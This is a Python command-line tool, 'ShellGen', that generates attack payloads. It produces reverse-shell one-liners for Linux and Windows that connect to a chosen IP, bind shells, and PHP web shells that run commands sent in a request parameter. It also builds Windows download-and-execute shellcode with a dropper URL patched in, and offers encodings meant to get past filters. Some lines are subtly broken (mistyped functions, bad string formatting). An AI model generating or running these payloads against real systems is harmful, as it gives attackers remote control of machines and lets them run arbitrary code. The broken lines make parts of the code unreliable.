#!/usr/bin/python3
# Created by vay3t feat. elborikua


import argparse
import base64
import urllib.parse
import json
import binascii


def linuxRev(ipDst, portDst, shell):
    a = "%s -i >& /dev/tcp/%s/%d 0>&1" % (shell, ipDst, portDst)
    b = "socat TCP4:%s:%d EXEC:%s,pty,stderr,setsid,sigint,sane" % (
        ipDst,
        portDst,
        shell,
    )
    c = (
        'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["%s","-i"]);\''
        % (ipDst, portDst, shell)
    )
    d = (
        'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["%s","-i"]);\''
        % (ipDst, portDst, shell)
    )
    e = "127.0.0.1;%s -i >& /dev/tcp/%s/%d 0>&1" % (shell, ipDst, portDst)
    f = "0<&196;exec 196<>/dev/tcp/%s/%d; %s <&196 >&196 2>&196" % (
        ipDst,
        portDst,
        shell,
    )
    g = "exec 5<>/dev/tcp/%s/%d; while read line 0<&5; do $line 2>&5 >&5; done" % (
        ipDst,
        portDst,
    )
    h = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|nc %s %d >/tmp/f" % (
        shell,
        ipDst,
        portDst,
    )
    i = "mknod /var/tmp/fgp p ; %s 0</var/tmp/fgp |nc %s %d 1>/var/tmp/fgp" % (
        shell,
        ipDst,
        portDst,
    )
    j = (
        'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("%s -i");};\''
        % (ipDst, portDst, shell)
    )
    k = 'php -r \'$sock=fsockopen("%s",%d);exec("%s -i <&3 >&3 2>&3");\'' % (
        ipDst,
        portDst,
        shell,
    )
    l = "nc -e %s %s %d" % (shell, ipDst, portDst)
    # m = "/bin/telnet %s 80 | /bin/sh | /bin/telnet %s 25" % (ipDst, portDst)
    n = "mknod backpipe p && telnet %s %d 0<backpipe | %s 1>backpipe" % (
        ipDst,
        portDst,
        shell,
    )
    o = (
        'ruby -rsocket -e\'f=TCPSocket.open("%s",%d).to_i;exec slog.infof("%s -i <&%%d >&%%d 2>&%%d",f,f,f)\''
        % (ipDst, portDst, shell)
    )
    p = "mknod /var/tmp/fgp p ; %s 0</var/tmp/fgp |nc %s %d 1>/var/tmp/fgp" % (
        shell,
        ipDst,
        portDst,
    )
    q = (
        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"%s:%d\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
        % (ipDst, portDst)
    )
    r = (
        'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
        % (ipDst, portDst)
    )
    s = (
        'awk \'BEGIN {s = "/inet/tcp/0/%s>/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }\}\' /dev/null'
        % (ipDst, portDst)
    )
    t = (
        "lua -e \"required('socket');required('os');t=socket.tcp();t:connect('%s','%d');os.execute('%s -i <&3 >&3 2>&3');\""
        % (ipDst, portDst, shell)
    )
    u = (
        'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%d");cmd:=exec.Command("%s");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'
        % (ipDst, portDst, shell)
    )
    return (a, b, c, d, e, f, g, h, i, j, k, l, n, o, p, q, r, s, t, u)


def windowsRev(ipDst, portDst):
    a = (
        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
        % (ipDst, portDst)
    )
    return [a]


def linuxBind(portSrc, shell):
    a = "nc -n -l -p %d -e %s" % portSrc, shell
    b = "socat TCP-L:%d EXEC:%s" % portSrc, shell
    c = "ncat -l -p %d -e %s" % portSrc, shell
    d = (
        'python3 -c \'import socket,subprocess;socket.socket(socket.AF_INET,socket.SOCK_STREAM).bind(("0.0.0.0",%d));socket.socket().listen(1);conn,addr=socket.socket().accept();subprocess.Popen(["%s","-i"],stdin=conn,stdout=conn,stderr=conn)\''
        % (portSrc, shell)
    )
    e = (
        'python -c \'import socket,subprocess;socket.socket(socket.AF_INET,socket.SOCK_STREAM).bind(("0.0.0.0",%d));socket.socket().listen(1);conn,addr=socket.socket().accept();subprocess.Popen(["%s","-i"],stdin=conn,stdout=conn,stderr=conn)\''
        % (portSrc, shell)
    )
    f = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|nc -n -l -p %d >/tmp/f" % (
        shell,
        portSrc,
    )
    g = "mknod /var/tmp/fgp p ; %s 0</var/tmp/fgp |nc -n -l -p %d 1>/var/tmp/fgp" % (
        shell,
        portSrc,
    )

    h = (
        'ruby -rsocket -e \'f=TCPServer.new("0.0.0.0",%d).accept;exec sprintf("%s -i <&%%d >&%%d 2>&%%d",f.fileno,f.fileno,f.fileno)\''
        % (portSrc, shell)
    )
    i = (
        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET->new(LocalPort,%d,Reuse,1,Listen)->accept;STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
        % portSrc,
    )
    j = (
        "awk 'BEGIN{s=\"/inet/tcp/0/0/%d\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
        % portSrc,
    )
    return (a, b, c, d, e, f, g, h, i, j)


def phpShells(shell):
    a = "<?php system(" + shell + ");?>"
    b = "<?php echo shell_exec(" + shell + ");?>"
    c = "<?php exec(" + shell + ",$array);print_r($array);?>"
    d = "<?php passsthru(" + shell + ");?>"
    e = "<?php preg_replace('/.*/e','system(" + shell + ");','');?>"
    f = "<?php echo `" + shell + "`;?>"
    return [a, b, c, d, e, f]


def url_hexified(url):
    x = binascii.hexlify(url)
    x = x.decode("utf-8")
    a = [x[i : i + 2] for i in range(0, len(x), 2)]
    list = ""
    for goat in a:
        list = list + "\\x" + goat.rstrip()
    return list


# windows/download_exec
def generate_shellcode(url):
    # shellcode modified from https://www.exploit-db.com/exploits/24318/ - tested on windows xp, windows 7, windows 10, server 2008, server 2012
    shellcode = (
        "\\x33\\xC9\\x64\\x8B\\x41\\x30\\x8B\\x40\\x0C\\x8B"
        "\\x70\\x14\\xAD\\x96\\xAD\\x8B\\x58\\x10\\x8B\\x53"
        "\\x3C\\x03\\xD3\\x8B\\x52\\x78\\x03\\xD3\\x8B\\x72"
        "\\x20\\x03\\xF3\\x33\\xC9\\x41\\xAD\\x03\\xC3\\x81"
        "\\x38\\x47\\x65\\x74\\x50\\x75\\xF4\\x81\\x78\\x04"
        "\\x72\\x6F\\x63\\x41\\x75\\xEB\\x81\\x78\\x08\\x64"
        "\\x64\\x72\\x65\\x75\\xE2\\x8B\\x72\\x24\\x03\\xF3"
        "\\x66\\x8B\\x0C\\x4E\\x49\\x8B\\x72\\x1C\\x03\\xF3"
        "\\x8B\\x14\\x8E\\x03\\xD3\\x33\\xC9\\x51\\x68\\x2E"
        "\\x65\\x78\\x65\\x68\\x64\\x65\\x61\\x64\\x53\\x52"
        "\\x51\\x68\\x61\\x72\\x79\\x41\\x68\\x4C\\x69\\x62"
        "\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x53\\xFF\\xD2"
        "\\x83\\xC4\\x0C\\x59\\x50\\x51\\x66\\xB9\\x6C\\x6C"
        "\\x51\\x68\\x6F\\x6E\\x2E\\x64\\x68\\x75\\x72\\x6C"
        "\\x6D\\x54\\xFF\\xD0\\x83\\xC4\\x10\\x8B\\x54\\x24"
        "\\x04\\x33\\xC9\\x51\\x66\\xB9\\x65\\x41\\x51\\x33"
        "\\xC9\\x68\\x6F\\x46\\x69\\x6C\\x68\\x6F\\x61\\x64"
        "\\x54\\x68\\x6F\\x77\\x6E\\x6C\\x68\\x55\\x52\\x4C"
        "\\x44\\x54\\x50\\xFF\\xD2\\x33\\xC9\\x8D\\x54\\x24"
        "\\x24\\x51\\x51\\x52\\xEB\\x47\\x51\\xFF\\xD0\\x83"
        "\\xC4\\x1C\\x33\\xC9\\x5A\\x5B\\x53\\x52\\x51\\x68"
        "\\x78\\x65\\x63\\x61\\x88\\x4C\\x24\\x03\\x68\\x57"
        "\\x69\\x6E\\x45\\x54\\x53\\xFF\\xD2\\x6A\\x05\\x8D"
        "\\x4C\\x24\\x18\\x51\\xFF\\xD0\\x83\\xC4\\x0C\\x5A"
        "\\x5B\\x68\\x65\\x73\\x73\\x61\\x83\\x6C\\x24\\x03"
        "\\x61\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69"
        "\\x74\\x54\\x53\\xFF\\xD2\\xFF\\xD0\\xE8\\xB4\\xFF"
        "\\xFF\\xFF\\xURLHERE\\x00"
    )

    url_patched = url_hexified(str.encode(url))

    a = shellcode.replace("\\xURLHERE", url_patched)
    b = a.replace("\\x", "")
    c = base64.b64encode(binascii.unhexlify(b)).decode()

    return (a, b, c)


def helpEncode():
    return "Type of encoding => b64: base64, b64_utf16: base64_utf16, url: urlencode, durl: double_urlencode, hex: hexadecimal, json: json_escape"


def helpFormat():
    return "Type of format => msf: metasploit, hex: hexadecimal, b64: base64"


parser = argparse.ArgumentParser(description="ShellGen - Shells Generator")
subparsers = parser.add_subparsers(title="subcommands", dest="subcommand")


linux_rev = subparsers.add_parser("linux_rev", help="Linux reverse shells")

linux_rev.add_argument(
    "--shell",
    "-s",
    type=str,
    help="Type of shell",
    default="/bin/bash",
    dest="shellType",
)
linux_rev.add_argument(
    "--ip", "-ip", type=str, help="IP destination", required=True, dest="ipDst"
)
linux_rev.add_argument(
    "--port", "-p", type=int, help="Port destination", default=4444, dest="portDst"
)
linux_rev.add_argument(
    "--raw", "-r", help="Raw payload", action="store_true", dest="raw"
)

linux_rev.add_argument(
    "--encode",
    "-e",
    dest="encode",
    type=str,
    help=helpEncode(),
    choices=["b64", "b64_utf16", "url", "durl", "hex", "json"],
)

linux_bind = subparsers.add_parser("linux_bind", help="Linux bind shells")

linux_bind.add_argument(
    "--shell",
    "-s",
    type=str,
    help="Type of shell",
    default="/bin/bash",
    dest="shellType",
)
linux_bind.add_argument(
    "--port", "-p", type=int, help="Port source", default=4444, dest="portSrc"
)
linux_bind.add_argument(
    "--raw", "-r", help="Raw payload", action="store_true", dest="raw"
)

linux_bind.add_argument(
    "--encode",
    "-e",
    dest="encode",
    type=str,
    help=helpEncode(),
    choices=["b64", "b64_utf16", "url", "durl", "hex", "json"],
)


windows_rev = subparsers.add_parser("windows_rev", help="Windows reverse shells")

windows_rev.add_argument(
    "--ip", "-ip", type=str, help="IP destination", required=True, dest="ipDst"
)
windows_rev.add_argument(
    "--port", "-p", type=int, help="Port destination", default=4444, dest="portDst"
)
windows_rev.add_argument(
    "--raw", "-r", help="Raw payload", action="store_true", dest="raw"
)

windows_rev.add_argument(
    "--encode",
    "-e",
    dest="encode",
    type=str,
    help=helpEncode(),
    choices=["b64", "b64_utf16", "url", "durl", "hex", "json"],
)

windows_download_exec = subparsers.add_parser(
    "download_exec", help="Windows shellcode generator for download and execute"
)

windows_download_exec.add_argument(
    "--url", "-u", type=str, help="Url dropper", required=True, dest="url"
)

windows_download_exec.add_argument(
    "-f",
    "--format",
    type=str,
    help=helpFormat(),
    choices=["msf", "hex", "b64"],
    default="msf",
    dest="format",
)

windows_download_exec.add_argument(
    "--raw", "-r", help="Raw payload", action="store_true", dest="raw"
)

php_shell = subparsers.add_parser("php_shell", help="PHP shells")

php_shell.add_argument(
    "-m",
    "--method",
    type=str,
    help="Type of method",
    choices=["request", "get", "post", "REQUEST", "GET", "POST"],
    default="request",
    dest="method",
)

php_shell.add_argument(
    "-p",
    "--parameter",
    help="Parameter ex: ?<parameter>=whoami",
    default="cmd",
    dest="parameter",
)

php_shell.add_argument(
    "--raw", "-r", help="Raw payload", action="store_true", dest="raw"
)

php_shell.add_argument(
    "--encode",
    "-e",
    dest="encode",
    type=str,
    help=helpEncode(),
    choices=["b64", "b64_utf16", "url", "durl", "hex", "json"],
)


args = parser.parse_args()
match args.subcommand:
    case "linux_rev":
        for line in linuxRev(args.ipDst, args.portDst, args.shellType):
            if args.encode:
                match args.encode:
                    case "b64":
                        line = base64.b64encode(line.encode("utf-8")).decode("utf-8")
                    case "b64_utf16":
                        line = base64.b64encode(line.encode("utf-16")).decode("utf-8")
                    case "url":
                        line = urllib.parse.quote(line)
                    case "durl":
                        line = urllib.parse.quote(urllib.parse.quote(line))
                    case "hex":
                        line = line.encode("utf-8").hex()
                    case "json":
                        line = json.dumps(line)
            if args.raw:
                print(line)
            else:
                print("[\033[1;34m*\033[0m] " + line)
    case "linux_bind":
        for line in linuxBind(args.portSrc, args.shellType):
            if args.encode:
                match args.encode:
                    case "b64":
                        line = base64.b64encode(line.encode("utf-8")).decode("utf-8")
                    case "b64_utf16":
                        line = base64.b64encode(line.encode("utf-16")).decode("utf-8")
                    case "url":
                        line = urllib.parse.quote(line)
                    case "durl":
                        line = urllib.parse.quote(urllib.parse.quote(line))
                    case "hex":
                        line = line.encode("utf-8").hex()
                    case "json":
                        line = json.dumps(line)
            if args.raw:
                print(line)
            else:
                print("[\033[1;34m*\033[0m] " + line)

    case "windows_rev":
        for line in windowsRev(args.ipDst, args.portDst):
            if args.encode:
                match args.encode:
                    case "b64":
                        line = base64.b64encode(line.encode("utf-8")).decode("utf-8")
                    case "b64_utf16":
                        line = base64.b64encode(line.encode("utf-16")).decode("utf-8")
                    case "url":
                        line = urllib.parse.quote(line)
                    case "durl":
                        line = urllib.parse.quote(urllib.parse.quote(line))
                    case "hex":
                        line = line.encode("utf-8").hex()
                    case "json":
                        line = json.dumps(line)
            if args.raw:
                print(line)
            else:
                print("[\033[1;34m*\033[0m] " + line)

    case "download_exec":
        match args.format:
            case "msf":
                print(
                    "[\033[1;34m*\033[0m] Generating the payload shellcode metasploit format...\n"
                )
                line = generate_shellcode(args.url)[0]
            case "hex":
                print(
                    "[\033[1;34m*\033[0m] Generating the payload shellcode hexadecimal format...\n"
                )
                line = generate_shellcode(args.url)[1]
            case "b64":
                print(
                    "[\033[1;34m*\033[0m] Generating the payload shellcode base64 format...\n"
                )
                line = generate_shellcode(args.url)[2]
        if args.raw:
            print(line)
        else:
            print("[\033[1;34m*\033[0m] " + line)

    case "php_shell":
        prepare_global = f'$_{args.method.upper()}["{args.parameter}"]'
        for line in phpShells(prepare_global):
            if args.encode:
                match args.encode:
                    case "b64":
                        line = base64.b64encode(line.encode("utf-8")).decode("utf-8")
                    case "b64_utf16":
                        line = base64.b64encode(line.encode("utf-16")).decode("utf-8")
                    case "url":
                        line = urllib.parse.quote(line)
                    case "durl":
                        line = urllib.parse.quote(urllib.parse.quote(line))
                    case "hex":
                        line = line.encode("utf-8").hex()
                    case "json":
                        line = json.dumps(line)
            if args.raw:
                print(line)
            else:
                print("[\033[1;34m*\033[0m] " + line)
